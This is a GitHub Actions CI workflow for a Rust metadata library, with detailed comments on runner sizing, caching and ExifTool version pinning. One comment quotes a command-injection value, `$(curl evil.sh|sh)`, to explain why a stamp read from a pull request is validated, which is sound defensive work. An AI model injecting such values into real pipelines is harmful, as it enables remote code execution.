name: CI

on:
  # Push is restricted to main: every other branch is covered by its pull
  # request, so running both produced two full duplicate runs per PR push.
  # Requiring "Lint & Audit"/"Build & Test" as status checks also means the
  # push run and the PR run would race to report the same check name on the
  # same SHA, and a cancelled push run could overwrite a green PR run.
  push:
    branches: [main]
  pull_request:
    branches: ['**']
  # Manual trigger. Now that "Lint & Audit"/"Build & Test" are required status
  # checks, a PR whose event GitHub failed to schedule has no required check to
  # report and cannot be merged at all. This is the escape hatch that re-runs
  # CI against a branch head without needing an empty commit.
  workflow_dispatch:
  # NOTE: no paths-ignore. These jobs are required status checks, and a
  # required check that is filtered out never reports at all — a docs-only PR
  # would sit "Expected — waiting for status" forever with no way to merge.
  # Skipping cheaply is not worth a class of permanently unmergeable PRs.

concurrency:
  # Pull request runs are keyed by branch, so pushing a new commit cancels the
  # superseded run (~13 CI minutes saved per force-push).
  #
  # Main runs share the branch ref, so a newer main commit cancels the obsolete
  # build rather than consuming runners for a commit that can no longer deploy.
  group: ${{ github.workflow }}-${{ github.event_name == 'push' && github.ref || github.head_ref || github.ref }}
  cancel-in-progress: true

env:
  CARGO_TERM_COLOR: always
  RUST_BACKTRACE: 1

# Runner sizing (WarpBuild x64: 2x=2vCPU/7GB, 4x=4/16, 8x=8/32, 16x=16/64).
# Sizes below were chosen from measured step timings, not job wall-clock --
# a slow job is not necessarily a CPU-bound one. See the per-job notes.
#
# The Build & Test workload was swept across every size on a throwaway
# benchmark workflow (removed once it had served its purpose; see PR #305 for
# the harness). Seconds, cold cache, mean of the runs taken:
#
#         build   nextest   clippy   total   gain vs prev   cost vs prev
#   2x      188      381       30      599        --             --
#   4x      118      202       20      339      1.77x           2x
#   8x       97      122       14      233      1.46x           2x
#  16x       91       94       16      200      1.16x           2x
#  32x       96       80       12      187      1.07x           2x
#
# 8x is both the knee and this repo's ceiling. Each doubling past it costs
# 2x and returns well under 1.2x, because `cargo build --release` saturates
# completely at 8 cores (97 -> 91 -> 96s is flat within noise) and it is the
# largest single component. Only nextest keeps scaling, and not enough to
# carry the total. The 16x/32x rows are kept as the evidence for stopping,
# not as options.
#
# Measure before changing these; do not adjust by intuition. Reproducing the
# harness is a few lines: a matrix over `runs-on:` labels running these same
# commands with each phase as its own step, then read per-step seconds from
# `gh api repos/{owner}/{repo}/actions/runs/{id}/jobs`.
#
# NOTE: "Lint & Audit" and "Build & Test" are required status checks. Changing
# `runs-on` is safe because it does not change the check name; renaming or
# splitting these jobs is NOT safe -- a required check that never reports
# leaves every PR permanently unmergeable (see the paths-ignore note above).
jobs:
  lint:
    name: Lint & Audit
    # 4x, not 8x: of this job's ~4 minutes only ~51s is compile-bound
    # (clippy --all-features). The dominant step is rustsec/audit-check at
    # ~2m55s, which is network I/O against the advisory database and does not
    # get faster with more cores.
    runs-on: warp-ubuntu-latest-x64-4x
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: dtolnay/rust-toolchain@4cda84d5c5c54efe2404f9d843567869ab1699d4 # stable
        with:
          components: rustfmt, clippy
      # WarpBuild-native cache backend: on warp-ubuntu-* runners this reads/
      # writes through Warp's cache infra instead of the (much slower, cross-
      # region) GitHub Actions cache. shared-key separates this job's cache
      # from Build & Test's so a clippy-only cache miss can't evict the other.
      - uses: WarpBuilds/rust-cache@9d0cc3090d9c87de74ea67617b246e978735b1a1 # v2.9.1
        with:
          cache-on-failure: true
          cache-provider: warpbuild
          shared-key: lint
      - run: cargo fmt --all -- --check
      - run: cargo clippy --all-features -- -D warnings
      - uses: rustsec/audit-check@e9159ac5f7d7d873ce074ca134da2f445c0a4a61 # v1.3.2
        with:
          token: ${{ secrets.GITHUB_TOKEN }}
          # Accept the informational "bincode is unmaintained" advisory: it is a
          # transitive dependency with no security vulnerability, and the
          # advisory postdates the last green run. Reporting it also makes the
          # action fail on push events ("Resource not accessible by
          # integration") when it tries to file an issue without issues:write.
          ignore: RUSTSEC-2025-0141

  test:
    name: Build & Test
    # 8x: this job is almost entirely parallelisable work -- cargo build
    # --release (parallel across codegen units), nextest (test-level
    # parallelism) and doc tests.
    #
    # It used to run five cargo invocations across three different feature
    # graphs, which cost a full nine-crate rebuild each time cargo saw a new
    # fingerprint. It is now three invocations over ONE feature graph
    # (--all-features), differing only where they must: release profile,
    # test profile, rustdoc.
    runs-on: warp-ubuntu-latest-x64-8x
    timeout-minutes: 25
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: dtolnay/rust-toolchain@4cda84d5c5c54efe2404f9d843567869ab1699d4 # stable
      # WarpBuild-native cache backend (see the Lint & Audit job for why).
      # cache-all-crates: this job also builds cargo-nextest and cbindgen via
      # taiki-e/install-action, and default caching only covers workspace
      # dependencies, not CI tooling.
      - uses: WarpBuilds/rust-cache@9d0cc3090d9c87de74ea67617b246e978735b1a1 # v2.9.1
        with:
          cache-on-failure: true
          cache-provider: warpbuild
          shared-key: test
          cache-all-crates: true
      - uses: taiki-e/install-action@07b4745e0c39a41822af610387492e3e53aa222b # v2.83.4
        with:
          # Pin cbindgen: the committed api/oxidex.h is generated with 0.29.2,
          # and newer cbindgen emits extra #define macros that would fail the
          # "Verify C header is up-to-date" check non-deterministically.
          tool: cargo-nextest,cbindgen@0.29.2,sccache
      # sccache covers the gap rust-cache structurally cannot. rust-cache
      # restores target/, but cargo fingerprints path dependencies by mtime
      # and git checkout rewrites every workspace source file with a fresh
      # mtime, so the nine workspace crates are recompiled on every run no
      # matter what is in target/ (measured: cache-workspace-crates changed
      # 408s to 406s, i.e. nothing). sccache keys on a hash of the source
      # text and compiler flags instead, so it is immune to that churn.
      #
      # restore-keys IS safe here, unlike on the ExifTool cache: sccache
      # entries are content-addressed, so a stale entry cannot return a
      # wrong object -- it simply fails to match and the compile proceeds.
      # The run_id in the primary key makes every run save a fresh, larger
      # entry rather than repeatedly re-saving an identical one.
      - name: Restore sccache
        id: sccache-restore
        uses: WarpBuilds/cache/restore@dad44e2487e9dc889ad6e6bd198e77bb2d828eee # v2.0.0
        with:
          path: /tmp/sccache
          key: sccache-test-${{ runner.os }}-${{ github.run_id }}
          restore-keys: |
            sccache-test-${{ runner.os }}-
      - name: Enable sccache
        run: |
          echo "RUSTC_WRAPPER=sccache" >> "$GITHUB_ENV"
          echo "SCCACHE_DIR=/tmp/sccache" >> "$GITHUB_ENV"
          echo "SCCACHE_CACHE_SIZE=5G" >> "$GITHUB_ENV"
      # Pinned, not "newest". This step used to scrape the newest
      # Image-ExifTool tarball off SourceForge's RSS feed, which meant the
      # release CI graded against changed whenever upstream published -- while
      # the transcriptions in this repo stayed put. Different releases select
      # different sub-tables for the same bytes (13.59 vs 13.55 disagree on
      # Canon::ColorData11's discriminator), so that drift manufactures
      # regressions and fixes that have nothing to do with the diff under test.
      # The version comes from .exiftool-version, the same file the Rust and
      # Python oracles compile/read it from, so there is one source of truth.
      - name: Resolve pinned ExifTool version
        id: exiftool-version
        run: |
          set -euo pipefail
          V=$(tr -d '[:space:]' < .exiftool-version)
          case "$V" in
            *[!0-9.]* | "" | .* | *.)
              echo "::error::refusing non-numeric ExifTool pin '$V'"; exit 1 ;;
          esac
          echo "Pinned ExifTool: $V"
          echo "version=$V" >> "$GITHUB_OUTPUT"
      # Caches only the extracted tarball, not the Archive::Zip install: that
      # one goes into system perl dirs via sudo, and restoring those from a
      # cache is exactly the kind of half-populated perl tree that produces a
      # confidently-wrong coverage number instead of a crash. The download is
      # the network cost worth skipping; the cpan install stays unconditional.
      #
      # The key carries the resolved version and nothing else fuzzy -- no
      # restore-keys -- so a `.exiftool-version` bump always misses and
      # re-downloads. A loosely-matched key here would serve a stale ExifTool.
      # restore + save as separate steps rather than the combined action: the
      # combined one saves from a post step declared `post-if: success()`, so
      # a later failure in this job (a flaky test, say) throws away a
      # perfectly good ExifTool download and the next run re-fetches it. The
      # explicit save below runs as soon as the tree is verified.
      - name: Restore pinned ExifTool source
        id: exiftool-cache
        uses: WarpBuilds/cache/restore@dad44e2487e9dc889ad6e6bd198e77bb2d828eee # v2.0.0
        with:
          path: /tmp/exiftool-src
          key: exiftool-${{ steps.exiftool-version.outputs.version }}-${{ runner.os }}
      - name: Download pinned ExifTool
        if: steps.exiftool-cache.outputs.cache-hit != 'true'
        env:
          V: ${{ steps.exiftool-version.outputs.version }}
        run: |
          set -euo pipefail
          curl -sSL "https://github.com/exiftool/exiftool/archive/refs/tags/$V.tar.gz" \
            -o /tmp/exiftool.tar.gz
          mkdir -p /tmp/exiftool-src
          tar xzf /tmp/exiftool.tar.gz -C /tmp/exiftool-src --strip-components=1
      # Archive::Zip gates every ZIP-container format. Without it a .docx
      # reports FileType: ZIP and container coverage silently collapses,
      # while -ver still prints the right release -- so install it and
      # assert it, rather than trusting the version string alone.
      #
      # Both this and the assertions below run even on a cache hit: a
      # corrupted or wrong-version cache entry must fail the job, not sail
      # through into a graded comparison run.
      - name: Install Archive::Zip and verify ExifTool
        env:
          V: ${{ steps.exiftool-version.outputs.version }}
        run: |
          set -euo pipefail
          sudo cpanm --notest Archive::Zip 2>/dev/null || sudo cpan -T Archive::Zip
          perl -MArchive::Zip -e 1
          echo "/tmp/exiftool-src" >> "$GITHUB_PATH"
          GOT=$(/tmp/exiftool-src/exiftool -ver)
          [ "$GOT" = "$V" ] || { echo "::error::installed ExifTool $GOT, expected $V"; exit 1; }
          # Exported for the nextest step below: EXIFTOOL points the oracle
          # at the pinned checkout explicitly rather than relying on PATH
          # order, so a runner image shipping its own exiftool cannot
          # quietly win the lookup.
          echo "EXIFTOOL=/tmp/exiftool-src/exiftool" >> "$GITHUB_ENV"
      # Only on a miss, and only once the step above has proved the tree is
      # the right release -- default `success()` semantics are load-bearing
      # here, so a failed verify never persists a bad tree. Reuses the
      # restore step's cache-primary-key rather than recomputing it.
      - name: Save pinned ExifTool source
        if: steps.exiftool-cache.outputs.cache-hit != 'true'
        uses: WarpBuilds/cache/save@dad44e2487e9dc889ad6e6bd198e77bb2d828eee # v2.0.0
        with:
          path: /tmp/exiftool-src
          key: ${{ steps.exiftool-cache.outputs.cache-primary-key }}
      # ONE feature graph for the whole job. `--all-features` already implies
      # tag-comparison-binary and exiftool-comparison, so naming either again
      # is redundant -- and naming a DIFFERENT subset is expensive: every
      # distinct feature set gets its own fingerprint, so cargo rebuilds all
      # nine workspace crates for it. Measured on run 31274865213, that is
      # what the old five-invocation layout cost: 406s of which ~139s was
      # recompiling and re-running work another step had already done.
      #
      # If you add a step here, give it `--all-features` and nothing else.
      - run: cargo build --release --all-features
      # Tests run in the (unwind) test profile: the release profile sets
      # panic = "abort", which newer cargo refuses to mix with the unwind test
      # harness. So this is a second compile by necessity -- profile, not
      # features. The release artifacts themselves are covered by the build
      # step above and by release.yml's per-platform builds on tag pushes.
      #
      # This one invocation now covers what used to be three: the unit and
      # integration suites, the C FFI test (oxidex::ffi_c_integration), and
      # the exiftool-comparison suite -- the last only because ExifTool is
      # installed ABOVE this step now. Moving that install back below here
      # would not fail the job; it would silently skip the comparison tests.
      - run: cargo nextest run --all-features
      # rustdoc is a separate artifact kind, so this compiles once more no
      # matter what. Same feature set regardless, to reuse everything else.
      - name: Run doc tests
        run: cargo test --doc --all-features
      - name: Verify C header is up-to-date
        run: |
          cbindgen --config cbindgen.toml --crate oxidex --output api/oxidex.h.tmp
          diff -q api/oxidex.h api/oxidex.h.tmp || (echo "C header out of date" && exit 1)
          rm api/oxidex.h.tmp
      # Hit rate is the number to watch when tuning this job: a low rate means
      # sccache is paying hashing overhead for nothing and should be dropped,
      # not tuned. `always()` so a failed build still reports its stats.
      - name: sccache stats
        if: always()
        run: sccache --show-stats
      # always(): the compilations this cached already happened, so persisting
      # them is useful even when a later test fails -- same reasoning as
      # cache-on-failure on rust-cache above.
      - name: Save sccache
        if: always()
        uses: WarpBuilds/cache/save@dad44e2487e9dc889ad6e6bd198e77bb2d828eee # v2.0.0
        with:
          path: /tmp/sccache
          key: ${{ steps.sccache-restore.outputs.cache-primary-key }}
  # The generated ExifTool tables are 100k+ lines that no reviewer reads in a
  # diff, so their correctness rests entirely on verify.py -- which, until this
  # job existed, nothing ever ran. A hand-edit of binary_tables.rs, or a
  # regeneration against a different ExifTool, passed every other check.
  #
  # This re-parses the COMMITTED Rust and diffs it against a ground-truth dump
  # taken independently from ExifTool's Perl symbol table, so it fails on a
  # fabricated or drifted entry rather than on a mismatched formatting guess.
  # No Rust build is needed: verify.py reads the .rs as text.
  verify-tables:
    name: Verify Generated Tables
    # 2x on purpose: this is a tarball fetch plus a perl/python pass over one
    # file, ~30s and entirely I/O-bound. The sizing measurements above apply
    # to compile-bound jobs and buy nothing here -- 2x is for the Warp queue
    # (seconds, vs minutes on the GitHub-hosted pool), not for the cores.
    runs-on: warp-ubuntu-latest-x64-2x
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      # The release is read from the artifact's own stamp rather than pinned
      # here. A pin in this file would be a second source of truth, and when
      # the two drifted the job would report hundreds of spurious differences
      # that look like transcription errors instead of "wrong ExifTool".
      # The stamp is read out of a file the pull request controls, so it is
      # untrusted input. It is validated against a strict numeric pattern here
      # and passed onward through env rather than `${{ }}` interpolation: a
      # value like `$(curl evil.sh|sh)` expanded inside a run: block would be
      # remote code execution on a fork PR.
      - name: Resolve stamped ExifTool release
        id: stamp
        run: |
          set -euo pipefail
          V=$(sed -n 's/^pub const EXIFTOOL_VERSION: &str = "\(.*\)";$/\1/p' \
                src/exiftool_tables/binary_tables.rs)
          [ -n "$V" ] || { echo "::error::binary_tables.rs has no EXIFTOOL_VERSION stamp"; exit 1; }
          case "$V" in
            *[!0-9.]* | "" | .* | *.) echo "::error::refusing non-numeric ExifTool version '$V'"; exit 1 ;;
          esac
          echo "version=$V" >> "$GITHUB_OUTPUT"
          echo "Tables declare ExifTool $V"
      - name: Fetch that ExifTool source
        env:
          ET_VERSION: ${{ steps.stamp.outputs.version }}
        run: |
          set -euo pipefail
          curl -sSL -o et.tar.gz \
            "https://github.com/exiftool/exiftool/archive/refs/tags/${ET_VERSION}.tar.gz"
          tar xzf et.tar.gz
      - name: Verify committed tables against ExifTool
        env:
          ET_VERSION: ${{ steps.stamp.outputs.version }}
        run: |
          python3 tools/exiftool-tables/verify.py \
            src/exiftool_tables/binary_tables.rs \
            "exiftool-${ET_VERSION}/lib" \
            --oracle tools/exiftool-tables/oracle.pl

  metrics:
    name: Benchmarks
    # 2x, and DELIBERATELY the same label as deploy-docs.yml's benchmark job.
    #
    # These two jobs publish comparable numbers -- this one as a 90-day
    # artifact, the other to the docs performance page -- so they must always
    # name the SAME runner. Criterion's measurement loop is single-threaded,
    # so cores buy nothing here beyond the build that precedes it; 2x is the
    # cheapest label that keeps the two aligned.
    #
    # These moved off ubuntu-latest on 2026-08-08 (CHANGELOG: benchmark
    # baseline discontinuity). Numbers from before that date were measured on
    # GitHub-hosted hardware and are NOT comparable with numbers after it. If
    # these ever move again, both must move together, in one commit, and the
    # discontinuity must be recorded in CHANGELOG.md again.
    runs-on: warp-ubuntu-latest-x64-2x
    timeout-minutes: 30
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    needs: [test]
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: dtolnay/rust-toolchain@4cda84d5c5c54efe2404f9d843567869ab1699d4 # stable
      - uses: WarpBuilds/rust-cache@9d0cc3090d9c87de74ea67617b246e978735b1a1 # v2.9.1
        with:
          cache-on-failure: true
          cache-provider: warpbuild
          shared-key: metrics
      - name: Run benchmarks
        run: cargo bench --bench integration_benchmarks --bench parse_benchmarks
      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: benchmark-results
          path: target/criterion/
          retention-days: 90
